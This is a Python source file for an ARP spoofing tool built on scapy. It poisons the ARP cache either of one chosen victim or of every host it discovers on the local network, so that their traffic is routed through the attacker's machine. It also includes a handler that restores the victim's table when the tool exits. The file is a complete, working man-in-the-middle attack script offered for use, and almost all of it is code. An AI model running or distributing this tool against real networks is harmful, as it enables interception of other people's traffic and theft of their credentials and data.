# coding=utf-8
#!/usr/bin/python

# ▄▄▄       ██▀███   ██▓███       ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
#▒████▄    ▓██ ▒ ██▒▓██░  ██▒   ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
#▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒
#░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒     ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  
 #▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░   ▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒
 #▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░
  #▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░        ░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░
  #░   ▒     ░░   ░ ░░          ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
      #░  ░   ░                       ░               ░ ░      ░ ░             ░  ░   ░     
                                                                                           
#---------------------------------------------IMPORTS ------------------------------------------
import signal
import sys
import socket
import os
import time
import argparse
from termcolor import cprint
from pyfiglet import figlet_format,Figlet


# Restore the network
def signal_handler(sig, frame):
  global victim_ip
  global routeur_ip
  global victim_mac
  global routeur_mac    
  print("\033[1;32m \n [/!\] Restoring the victim's network")
  send(ARP(pdst=victim_ip, macdst=victim_mac, psrc=routeur_ip, macsrc=routeur_mac, op=2), count=5, inter=.2)

  sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

from scapy.all import *
conf.verb = 0


#------------------------------------ SPOOFING/SNIFFING ARP FUNCTIONS -------------------------------------

#------------------------------------------------ONE VICTIM ----------------------------------------------

def single():
  sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing1)


def arp_spoof1():
  ethernet = Ether()
  arp = ARP(pdst=victim_ip, psrc=routeur_ip, op="is-at")
  packet = ethernet / arp
  sendp(packet, iface=iface)
  print("\033[1;11m [*] Spoof Sent")


def arp_sniffing1(pkt):
    if pkt[ARP].op == 1:  # is-at (response)
        print('\033[3;32m \n\n[+] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
        arp_spoof1()


#------------------------------------------------ NETWORK ATTACK -----------------------------------------------

def all():
  sniff(filter="arp and host "+routeur_ip, prn=arp_sniffing2)


def arp_spoof2(): # Get all MAC addresses of the network + spoof them
  # Création paquet ARP
  arp = ARP(pdst=victim_ip)
  # Create Broadcast Ether package
  # ff:ff:ff:ff:ff:ff broadcast (MAC addr)
  ether = Ether(dst="ff:ff:ff:ff:ff:ff")
  # stack them
  packet = ether/arp
  result = srp(packet, timeout=3, verbose=0)[0]
  # a list of victims, we will fill this in the upcoming loop
  victimes = []
  for sent, received in result:
      # For each response, we add ip and mac to the 'victimes' list
      victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
  # Print all network victims
  print("\033[3;35m \nCONNECTED DEVICES ON THE NETWORK")
  print("IP" + " "*18+"MAC")
  for x in victimes:
      print("{:16}    {}".format(x['ip'], x['mac']))

  ethernet = Ether()
  for x in victimes:
    if x['ip']==routeur_ip: # Delete router IP addr bc we don't want to send them an ARP packet 
      del x['ip']
    else:
      arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
      packet = ethernet / arp
      sendp(packet, iface=iface)
      print("\n")
      print("\033[1;31m [*]Spoof sent to ( {0} )".format(x['ip']))


def arp_sniffing2(pkt):
  if pkt[ARP].op == 1:  # is-at (response)
        print('\033[3;32m \n\n[+] Response of : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
        arp_spoof2()


#------------------------------------------------ MAIN PROGRAM --------------------------------------------------

print('\033[1;32m  [+] Starting ARP Spoofing Program... [*]')

#------------------------------------- ARGUMENTS ----------------------------------------
parser = argparse.ArgumentParser()
# -a for all
parser.add_argument('-a', dest='a', action='store_true', help="shows a")

# -s for single
parser.add_argument('-s', dest='s', action='store_true', help="shows s")

args = parser.parse_args()


# Interface input
cprint(figlet_format('arp spoofer', font='starwars'),'red', attrs=['bold'])
print("\033[3;31m © All credits to NextGenSpoofer  \n")
print("\033[1;33m Interface :")
iface=input()

# Get our IP and MAC addr
me_ip = get_if_addr(iface)
me_mac = get_if_hwaddr(iface)

# Print our infos (hacker)
print('\033[3;31m \n[i] My IP address : ( {0} ) \n [i] My MAC address : ( {1} )'.format(me_ip, me_mac))

# Router global definition 
routeur_ip=conf.route.route("0.0.0.0")[2]
x = sr1(ARP(pdst=routeur_ip), iface=iface, timeout=2)
routeur_mac = x.hwsrc


#------------------------------------------------------------------------------------------------
#--------------------------------------- MAIN !!! -----------------------------------------------
#------------------------------------------------------------------------------------------------

# Depending on the arguments (either we attack the whole network or just one victim)

# Network attack

try:
  if args.a:
    
    print("\033[1;34m Network IP(v4) :")
    victim_ip= input()
    
    print("\033[3;31m \n[+] Attacking the network %s on iface %s [*]"%(victim_ip, iface))
    print('[+] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
    all()

  # Single victim attack 
  if args.s:
    print("Victim IP(v4) :")
    victim_ip=input()
    x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) # Since it is a single victim, we need its MAC (for the signal_handler function)
    victim_mac = x.hwsrc

    print('\033[3;31m \n[+] Attacking the victim ( {0} ), MAC address ( {1} )'.format(victim_ip, victim_mac))
    print('[+] Attacking the router ( {0} ), MAC address ( {1} )'.format(routeur_ip, routeur_mac))
    single() 

except:
  print("\033[1;41m [/!\] Closing program...")
                 
# Stop program with CTRL+C
